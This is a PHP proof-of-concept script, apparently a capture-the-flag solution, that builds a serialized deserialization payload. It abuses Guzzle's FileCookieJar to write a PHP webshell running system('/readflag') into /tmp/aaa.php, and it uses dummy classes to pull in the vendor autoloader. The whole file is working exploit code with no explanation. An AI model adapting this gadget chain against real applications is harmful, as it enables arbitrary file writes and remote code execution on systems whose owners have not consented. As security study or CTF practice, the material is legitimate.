<?php
use GuzzleHttp\Cookie\FileCookieJar;
use GuzzleHttp\Cookie\SetCookie;

class _www_frontend_vendor_autoload{}
class tmp_aaa{}

$obj1 = new _www_frontend_vendor_autoload();

$obj2 = new FileCookieJar('/tmp/aaa.php',true);
$obj3 = new tmp_aaa();
$payload = "<?php echo system('/readflag'); ?>";
$obj2->setCookie(new SetCookie([
    'Name' => 'foo', 'Value' => 'bar',
    'Discard' => false,
    'Domain' => $payload,
    'Expires' => time()]
));

$a = array("Dashboard" => true, "Product" => true, "Order" => true, "User"=> true, "auto" => $obj1, "payload" => $obj2, "readFlag"=> $obj3);

echo serialize($a);
file_put_contents('/tmp/built_payload_poc', json_encode(serialize($a)));
